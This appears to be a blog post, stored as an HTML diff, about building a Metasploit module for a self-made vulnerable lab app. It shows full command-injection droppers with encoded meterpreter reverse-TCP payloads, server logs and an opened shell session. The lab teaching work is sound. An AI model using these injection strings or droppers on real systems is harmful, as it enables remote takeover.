+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> to disable<span class="o">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Exploit aborted due to failure: unknown: Cannot reliably check exploitability. 192.168.1.141:8000 - Could not connect to web service - no response <span class="s2">&#34;set ForceExploit true&#34;</span> to override check result.
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</span></span></code></pre></div><h3 id="adding-command-stager">Adding command stager</h3>
+<p>The next addition I want is a command stager.
+Command stagers are a way to drop and execute a payload onto a device through (in this case) command injection.
+This is actually what I started writing in the beginning, but I wanted to have working exploit code before trying to do a command stager.</p>
+<p>Using the documentation, it looks like I have to:</p>
+<ol>
+<li>Add the <code>Msf::Exploit::CmdStager</code> mixin</li>
+<li>Add associated metadata to the <code>update_info</code> function call:</li>
+</ol>
+<ul>
+<li><code>CmdStagerFlavor</code> at the top level</li>
+<li>Dropper data under <code>Targets</code></li>
+</ul>
+<ol start="3">
+<li>Update the <code>exploit</code> section to selectively call the <code>execute_command</code> or <code>execute_cmdstager</code> as needed</li>
+</ol>
+<p>I also had to test several <strong>Flavors</strong>, which are just the method used for staging, to see what works on my DNSSearcher.
+By getting a session on DNSSearcher through metasploit and running <code>which DROPPER</code>, where DROPPER was one of [echo, printf, curl, wget, lwp-request], I found that the <code>echo</code> and <code>printf</code> are available. I know that <code>bash</code> was available since I&rsquo;ve been using it in the session.</p>
+<p>I <a href="https://github.com/cnnrshd/service-to-shell/commit/dc7d6217bc0869fff3d25e1bd6c837dccff2052f">updated the code</a> and was now able to run a Dropper, but the exploit did not generate a session - here is me attempting to use the Bourne stager with a meterpreter reverse tcp payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl">msf6 exploit<span class="o">(</span>custom/dnssearcher<span class="o">)</span> &gt; <span class="nb">set</span> CMDSTAGER::FLAVOR bourne
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">CMDSTAGER::FLAVOR <span class="o">=</span>&gt; bourne
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">msf6 exploit<span class="o">(</span>custom/dnssearcher<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind</span> to 192.168.1.141:4444:-  -
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 0.0.0.0:4444 
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> to disable<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target is vulnerable. 192.168.1.141:8000 - Successfully exploited with <span class="sb">`</span>id<span class="sb">`</span> <span class="nb">command</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing Linux Dropper <span class="k">for</span> linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generated <span class="nb">command</span> stager: <span class="o">[</span><span class="s2">&#34;echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAJwEAAAAAAADWAQAAAAAAAAAQAAAAAAAASDHJSIHp7////0iNBe////9Iu8Ve2p9ZHPyJSDFYJ0gt+P///+L09KGwlgGFSpmN1wzSaNWWq4QEsJgDE/nBQJ6izjMWvdCVNPPHwHb+1q9fhJBcVHlJvWWSCBGl/onUAho3WJGtwUy4sI8DdtbRyluD19zchayMoRPrQUuWqp002vVcVHVujW8skFxFpdaN2xrmnnbA0a9fhZBcQpb3n1Hf19zchGQ6uNqfWRz8iQ==&gt;&gt;&#39;/tmp/ZpSQY.b64&#39; ; ((which base64 &gt;&amp;2 &amp;&amp; base64 -d -) || (which base64 &gt;&amp;2 &amp;&amp; base64 --decode -) || (which openssl &gt;&amp;2 &amp;&amp; openssl enc -d -A -base64 -in /dev/stdin) || (which python &gt;&amp;2 &amp;&amp; python -c &#39;import sys, base64; print base64.standard_b64decode(sys.stdin.read());&#39;) || (which perl &gt;&amp;2 &amp;&amp; perl -MMIME::Base64 -ne &#39;print decode_base64(</span><span class="nv">$_</span><span class="s2">)&#39;)) 2&gt; /dev/null &gt; &#39;/tmp/KyfYC&#39; &lt; &#39;/tmp/ZpSQY.b64&#39; ; chmod +x &#39;/tmp/KyfYC&#39; ; &#39;/tmp/KyfYC&#39; ; rm -f &#39;/tmp/KyfYC&#39; ; rm -f &#39;/tmp/ZpSQY.b64&#39;&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>883/883 bytes<span class="o">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</span></span></code></pre></div><p>Here are the DNSSearcher logs for attempting to throw this exploit:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">INFO:     172.17.0.1:33694 - &#34;GET /dns?domainname=bing.com+%26%26id HTTP/1.1&#34; 200 OK
+INFO:root:DNS lookup for bing.com &amp;&amp; echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAJwEAAAAAAADWAQAAAAAAAAAQAAAAAAAASDHJSIHp7////0iNBe////9Iu8Ve2p9ZHPyJSDFYJ0gt P/// L09KGwlgGFSpmN1wzSaNWWq4QEsJgDE/nBQJ6izjMWvdCVNPPHwHb 1q9fhJBcVHlJvWWSCBGl/onUAho3WJGtwUy4sI8DdtbRyluD19zchayMoRPrQUuWqp002vVcVHVujW8skFxFpdaN2xrmnnbA0a9fhZBcQpb3n1Hf19zchGQ6uNqfWRz8iQ==&gt;&gt;&#39;/tmp/ZpSQY.b64&#39; ; ((which base64 &gt;&amp;2 &amp;&amp; base64 -d -) || (which base64 &gt;&amp;2 &amp;&amp; base64 --decode -) || (which openssl &gt;&amp;2 &amp;&amp; openssl enc -d -A -base64 -in /dev/stdin) || (which python &gt;&amp;2 &amp;&amp; python -c &#39;import sys, base64; print base64.standard_b64decode(sys.stdin.read());&#39;) || (which perl &gt;&amp;2 &amp;&amp; perl -MMIME::Base64 -ne &#39;print decode_base64($_)&#39;)) 2&gt; /dev/null &gt; &#39;/tmp/KyfYC&#39; &lt; &#39;/tmp/ZpSQY.b64&#39; ; chmod  x &#39;/tmp/KyfYC&#39; ; &#39;/tmp/KyfYC&#39; ; rm -f &#39;/tmp/KyfYC&#39; ; rm -f &#39;/tmp/ZpSQY.b64&#39;
+INFO:root:Response status code: 0
+INFO:     172.17.0.1:33696 - &#34;GET /dns?domainname=bing.com+%26%26+echo+-n+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAJwEAAAAAAADWAQAAAAAAAAAQAAAAAAAASDHJSIHp7////0iNBe////9Iu8Ve2p9ZHPyJSDFYJ0gt+P///+L09KGwlgGFSpmN1wzSaNWWq4QEsJgDE/nBQJ6izjMWvdCVNPPHwHb+1q9fhJBcVHlJvWWSCBGl/onUAho3WJGtwUy4sI8DdtbRyluD19zchayMoRPrQUuWqp002vVcVHVujW8skFxFpdaN2xrmnnbA0a9fhZBcQpb3n1Hf19zchGQ6uNqfWRz8iQ==&gt;&gt;&#39;/tmp/ZpSQY.b64&#39;+;+((which+base64+&gt;%262+%26%26+base64+-d+-)+||+(which+base64+&gt;%262+%26%26+base64+--decode+-)+||+(which+openssl+&gt;%262+%26%26+openssl+enc+-d+-A+-base64+-in+/dev/stdin)+||+(which+python+&gt;%262+%26%26+python+-c+&#39;import+sys,+base64;+print+base64.standard_b64decode(sys.stdin.read());&#39;)+||+(which+perl+&gt;%262+%26%26+perl+-MMIME::Base64+-ne+&#39;print+decode_base64($_)&#39;))+2&gt;+/dev/null+&gt;+&#39;/tmp/KyfYC&#39;+&lt;+&#39;/tmp/ZpSQY.b64&#39;+;+chmod++x+&#39;/tmp/KyfYC&#39;+;+&#39;/tmp/KyfYC&#39;+;+rm+-f+&#39;/tmp/KyfYC&#39;+;+rm+-f+&#39;/tmp/ZpSQY.b64&#39; HTTP/1.1&#34; 200 OK
+</code></pre><p>I&rsquo;ve included the full logs above because I think the way they&rsquo;re represented is telling: <em>There are spaces in the base64 encoding</em>.
+A standard base64 alphabet has two special characters: <code>+</code> and <code>/</code> - the slash is being handled properly, but the plus is being converted to a space by the web server.
+This is a good lesson: <strong>Encode your strings, don&rsquo;t rely on web server behavior</strong>.
+I typically use <code>%20</code> for spaces instead of <code>+</code> (See my <a href="https://connorshade.com/service-to-shell/vulnerable-webapp/#interactive-access">vulnerable-webapp</a> post), but used <code>+</code> for this exploit.</p>
+<p>After modifying the <code>filter_bad_chars</code> function to substitute <code>+</code> for <code>%2B</code>, I was able to successfully use the dropper to deploy Meterpreter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl">msf6 exploit<span class="o">(</span>custom/dnssearcher<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind</span> to 192.168.1.141:4444:-  -
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 0.0.0.0:4444 
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> to disable<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target is vulnerable. 192.168.1.141:8000 - Successfully exploited with <span class="sb">`</span>id<span class="sb">`</span> <span class="nb">command</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing Linux Dropper <span class="k">for</span> linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generated <span class="nb">command</span> stager: <span class="o">[</span><span class="s2">&#34;echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAJwEAAAAAAADWAQAAAAAAAAAQAAAAAAAASDHJSIHp7////0iNBe////9Iu27ruDkjkrB8SDFYJ0gt+P///+L0XxTSMHsLBmwmYm50ElvaXi+x0j55nbU06yvAaEmY8SU+gZFhuviyIwTq5jYm2jW8FtDwrmsrsnx/t3iRIh/hNOcN0il5+JokYe7hcaZSyVknFHFNO8XaXzaBuFMm2jmbJtpONibL6SMmbnhA5PiMJATq5zYmzNoCNOS9caZSyJGRDbg5I5KwfA==&gt;&gt;&#39;/tmp/sWeUP.b64&#39; ; ((which base64 &gt;&amp;2 &amp;&amp; base64 -d -) || (which base64 &gt;&amp;2 &amp;&amp; base64 --decode -) || (which openssl &gt;&amp;2 &amp;&amp; openssl enc -d -A -base64 -in /dev/stdin) || (which python &gt;&amp;2 &amp;&amp; python -c &#39;import sys, base64; print base64.standard_b64decode(sys.stdin.read());&#39;) || (which perl &gt;&amp;2 &amp;&amp; perl -MMIME::Base64 -ne &#39;print decode_base64(</span><span class="nv">$_</span><span class="s2">)&#39;)) 2&gt; /dev/null &gt; &#39;/tmp/VKrbn&#39; &lt; &#39;/tmp/sWeUP.b64&#39; ; chmod +x &#39;/tmp/VKrbn&#39; ; &#39;/tmp/VKrbn&#39; ; rm -f &#39;/tmp/VKrbn&#39; ; rm -f &#39;/tmp/sWeUP.b64&#39;&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Transmitting intermediate stager...<span class="o">(</span><span class="m">126</span> bytes<span class="o">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">3045380</span> bytes<span class="o">)</span> to 172.18.0.1
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>172.18.0.3:4444 -&gt; 172.18.0.1:57650<span class="o">)</span> at 2023-08-07 14:18:00 +0000
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>883/883 bytes<span class="o">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl">meterpreter &gt; 
+</span></span><span class="line"><span class="ln">15</span><span class="cl">meterpreter &gt; ls
+</span></span><span class="line"><span class="ln">16</span><span class="cl">Listing: /app
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">=============</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl">Mode              Size  Type  Last modified              Name
+</span></span><span class="line"><span class="ln">20</span><span class="cl">----              ----  ----  -------------              ----
+</span></span><span class="line"><span class="ln">21</span><span class="cl">040755/rwxr-xr-x  <span class="m">40</span>    dir   2023-08-07 02:07:41 +0000  __pycache__
+</span></span><span class="line"><span class="ln">22</span><span class="cl">100644/rw-r--r--  <span class="m">1811</span>  fil   2023-08-04 12:59:59 +0000  main.py
+</span></span><span class="line"><span class="ln">23</span><span class="cl">100644/rw-r--r--  <span class="m">12</span>    fil   2023-08-04 12:59:59 +0000  requirements.txt
+</span></span></code></pre></div><p>This was done with the <strong>bourne</strong> Flavor, but I also want the <strong>printf</strong> and <strong>echo</strong> flavors to work.
+Running either of them says &ldquo;Exploit completed, but no session was created.&rdquo;</p>
+<h3 id="getting-the-other-stagers-echo-printf-working">Getting the other stagers (echo, printf) working</h3>
+<p>How can I get the other stagers working?
+My first thought is to enable some logging.
+I run <code>set verbose true</code> within Metasploit, verify I&rsquo;m using one of the failing stagers with <code>set CMDSTAGER::FLAVOR echo</code>, and run:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing Linux Dropper <span class="k">for</span> linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generated <span class="nb">command</span> stager: <span class="o">[</span><span class="s2">&#34;echo -en \\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x02\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x3e\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x78\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x38\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x07\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x27\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xd6\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x48\\\\x31\\\\xc9\\\\x48\\\\x81\\\\xe9\\\\xef\\\\xff\\\\xff\\\\xff\\\\x48\\\\x8d\\\\x05\\\\xef\\\\xff\\\\xff\\\\xff\\\\x48\\\\xbb\\\\x16\\\\xfc\\\\x27\\\\x9e\\\\xfb\\\\x73\\\\x74\\\\x40\\\\x48\\\\x31\\\\x58\\\\x27\\\\x48\\\\x2d\\\\xf8\\\\xff\\\\xff\\\\xff\\\\xe2\\\\xf4\\\\x27\\\\x03\\\\x4d\\\\x97\\\\xa3\\\\xea\\\\xc2\\\\x50\\\\x5e\\\\x75\\\\xf1\\\\xd3\\\\xca\\\\xba\\\\x1e\\\\x62\\\\x57\\\\xa6\\\\x4d\\\\x99\\\\xa1\\\\x7c\\\\x71\\\\x08\\\\x93\\\\x3c\\\\x5f\\\\xcf\\\\x91\\\\x79\\\\x35\\\\x19\\\\x46\\\\x96\\\\x0e\\\\xc6\\\\x62\\\\x19\\\\x76\\\\x1f\\\\x7c\\\\xfd\\\\x79\\\\x91\\\\xfe\\\\x3b\\\\xf1\\\\x80\\\\x6e\\\\xc7\\\\x6f\\\\x09\\\\xb3\\\\xca\\\\x76\\\\x40\\\\x07\\\\xa0\\\\xe7\\\\x36\\\\xfa\\\\xfe\\\\x25\\\\x08\\\\x9f\\\\x1a\\\\x4d\\\\x8e\\\\xa1\\\\x19\\\\x5e\\\\x18\\\\x19\\\\xf9\\\\x7e\\\\xd6\\\\x7e\\\\xb3\\\\x0d\\\\x65\\\\x5f\\\\x03\\\\xee\\\\xea\\\\xe3\\\\x24\\\\x1e\\\\x63\\\\x4e\\\\x96\\\\x27\\\\xf4\\\\xfe\\\\x3b\\\\xfd\\\\xa7\\\\x5e\\\\xcd\\\\xd1\\\\x91\\\\xfe\\\\x2a\\\\x2d\\\\x1f\\\\x5e\\\\x79\\\\xe7\\\\xe7\\\\x3c\\\\x19\\\\x48\\\\x18\\\\x7c\\\\xfd\\\\x78\\\\x91\\\\xfe\\\\x2d\\\\x1e\\\\x3e\\\\x4c\\\\xf3\\\\x22\\\\xd6\\\\x7e\\\\xb3\\\\x0c\\\\xad\\\\xe9\\\\x1a\\\\x27\\\\x9e\\\\xfb\\\\x73\\\\x74\\\\x40&gt;&gt;/tmp/aKiFH ; chmod 777 /tmp/aKiFH ; /tmp/aKiFH ; rm -f /tmp/aKiFH&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>1551/1551 bytes<span class="o">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</span></span></code></pre></div><p>On DNSSearcher, the logs are pretty empty:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">INFO:root:DNS lookup for bing.com &amp;&amp; 
+INFO:root:Response status code: 2
+WARNING:root:stderr: /bin/sh: 1: Syntax error: end of file unexpected
+
+INFO:     172.17.0.1:34070 - &#34;GET /dns?domainname=bing.com%20%26%26%20 HTTP/1.1&#34; 200 OK
+</code></pre><p>It looks like the payload isn&rsquo;t making it into DNSSearcher.
+With the complicated networking schenanigans, it&rsquo;s also difficult to figure out which interface to monitor in Wireshark.
+I decided to use TCPDump with the <code>-i any</code> flag to grab all traffic (Full command is <code>sudo tshark -ni any -f 'port 8000' -w echo.pcap</code>, I had to <code>touch echo.pcap</code> and chown it to root for this to work):</p>
+<p><img src="./images/no_upload.png" alt="A screenshot showing a Wireshark capture filtered to HTTP traffic. The capture shows a successful check with id, but the echo command is never sent" title="A screenshot showing a Wireshark capture filtered to HTTP traffic. The capture shows a successful check with id, but the echo command is never sent"></p>
+<p>As a debugging test, I tried adding a statement to print out the payload at several stages:</p>
+<ul>
+<li>Inside <code>exploit</code>, right before the <code>case</code> statement</li>
+<li>In <code>execute_command</code>, before the <code>send_request_cgi</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1"># for echo</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing Linux Dropper <span class="k">for</span> linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Command is H1�H������H�����H��֯�C��H1X<span class="err">&#39;</span>H-�������<span class="o">)</span>�� ��_y�r���ǌ����ע<span class="o">)</span>▒קּ���z������FX&gt;���d
+</span></span><span class="line"><span class="ln">4</span><span class="cl">                                                                                      �����o<span class="o">[</span>B�Ƕ0��z�����������<span class="o">)</span>f�<span class="o">[</span>G��޼��FX��Y�FIϡ�So��z������FN���٪����y0��C��
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generated <span class="nb">command</span> stager: <span class="o">[</span><span class="s2">&#34;echo -en \\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x02\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x3e\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x78\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x38\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x07\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x27\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xd6\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x48\\\\x31\\\\xc9\\\\x48\\\\x81\\\\xe9\\\\xef\\\\xff\\\\xff\\\\xff\\\\x48\\\\x8d\\\\x05\\\\xef\\\\xff\\\\xff\\\\xff\\\\x48\\\\xbb\\\\x86\\\\xd6\\\\xaf\\\\xf3\\\\x43\\\\x10\\\\x96\\\\xfe\\\\x48\\\\x31\\\\x58\\\\x27\\\\x48\\\\x2d\\\\xf8\\\\xff\\\\xff\\\\xff\\\\xe2\\\\xf4\\\\xb7\\\\x29\\\\xc5\\\\xfa\\\\x1b\\\\x89\\\\x20\\\\xee\\\\xce\\\\x5f\\\\x79\\\\xbe\\\\x72\\\\xd9\\\\xfc\\\\xdc\\\\xc7\\\\x8c\\\\xc5\\\\xf4\\\\x19\\\\x1f\\\\x93\\\\xb6\\\\x03\\\\x16\\\\xd7\\\\xa2\\\\x29\\\\x1a\\\\xd7\\\\xa7\\\\xd6\\\\xbc\\\\x86\\\\xab\\\\xda\\\\x7a\\\\x94\\\\xa1\\\\xec\\\\xd7\\\\xf1\\\\xfc\\\\x46\\\\x58\\\\x13\\\\x3e\\\\xfe\\\\xed\\\\xe7\\\\x64\\\\x0b\\\\xa9\\\\x94\\\\xfe\\\\x97\\\\x8a\\\\x6f\\\\x5b\\\\x42\\\\x9d\\\\xc7\\\\xb6\\\\x0f\\\\x30\\\\xc5\\\\xe3\\\\x19\\\\x7a\\\\xbc\\\\xa6\\\\x89\\\\xd3\\\\xf6\\\\xbb\\\\xc6\\\\xd0\\\\xef\\\\xdb\\\\xcf\\\\x29\\\\x66\\\\x87\\\\x5b\\\\x47\\\\xfc\\\\xdd\\\\xde\\\\xbc\\\\xaf\\\\x99\\\\x46\\\\x58\\\\x1f\\\\x19\\\\xce\\\\xe7\\\\x59\\\\xfc\\\\x46\\\\x49\\\\xcf\\\\xa1\\\\xce\\\\x53\\\\x6f\\\\x8a\\\\x84\\\\x7a\\\\xaa\\\\xa6\\\\xec\\\\xd7\\\\xf0\\\\xfc\\\\x46\\\\x4e\\\\xfc\\\\x80\\\\xdc\\\\xd9\\\\xaa\\\\xbb\\\\xc6\\\\xd0\\\\xee\\\\x13\\\\x79\\\\x30\\\\xaf\\\\xf3\\\\x43\\\\x10\\\\x96\\\\xfe&gt;&gt;/tmp/BJvmj ; chmod 777 /tmp/BJvmj ; /tmp/BJvmj ; rm -f /tmp/BJvmj&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">Sending <span class="nb">command</span> 
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>1551/1551 bytes<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># for printf</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing Linux Dropper <span class="k">for</span> linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Command is H1�H������H�����H�nf�K�U�H1X<span class="s1">&#39;H-������_�e�X��&amp;�ٍ?�/&lt;e��P���w�!��&gt;
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s1">                                                                          &amp;�ҫW�gQ�N��r]GWxW�:�hJL���e���acV��,�&#39;</span>�ƴS�?�6
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">                                                                                                                       �N��U<span class="p">&amp;</span>W��N�
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">                                                                                                                                  �<span class="p">&amp;</span>�Ϲ��i�gP�N�?�4i
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">��-_���K�U�
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generated <span class="nb">command</span> stager: <span class="o">[</span><span class="s2">&#34;printf &#39;\\177\\105\\114\\106\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\2\\0\\76\\0\\1\\0\\0\\0\\170\\0\\100\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\100\\0\\70\\0\\1\\0\\0\\0\\0\\0\\0\\0\\1\\0\\0\\0\\7\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\47\\1\\0\\0\\0\\0\\0\\0\\326\\1\\0\\0\\0\\0\\0\\0\\0\\20\\0\\0\\0\\0\\0\\0\\110\\61\\311\\110\\201\\351\\357\\377\\377\\377\\110\\215\\5\\357\\377\\377\\377\\110\\273\\156\\146\\17\\300\\113\\301\\125\\262\\110\\61\\130\\47\\110\\55\\370\\377\\377\\377\\342\\364\\137\\231\\145\\311\\23\\130\\343\\242\\46\\357\\331\\215\\172\\10\\77\\220\\57\\74\\145\\307\\21\\316\\120\\372\\353\\246\\167\\221\\41\\313\\24\\353\\76\\14\\46\\230\\322\\253\\127\\355\\4\\147\\121\\317\\116\\211\\320\\162\\26\\135\\107\\127\\3\\170\\127\\262\\177\\72\\317\\150\\112\\114\\4\\372\\347\\200\\145\\320\\21\\253\\177\\352\\141\\143\\126\\210\\316\\1\\54\\227\\47\\231\\306\\264\\123\\226\\77\\221\\66\\14\\17\\252\\116\\211\\334\\125\\46\\127\\371\\317\\116\\230\\14\\355\\46\\343\\317\\271\\214\\253\\151\\352\\4\\147\\120\\317\\116\\237\\77\\314\\64\\151\\12\\210\\316\\1\\55\\137\\221\\200\\17\\300\\113\\301\\125\\262&#39;&gt;&gt;/tmp/TnUKZ ; chmod +x /tmp/TnUKZ ; /tmp/TnUKZ ; rm -f /tmp/TnUKZ&#34;</span><span class="o">]</span>
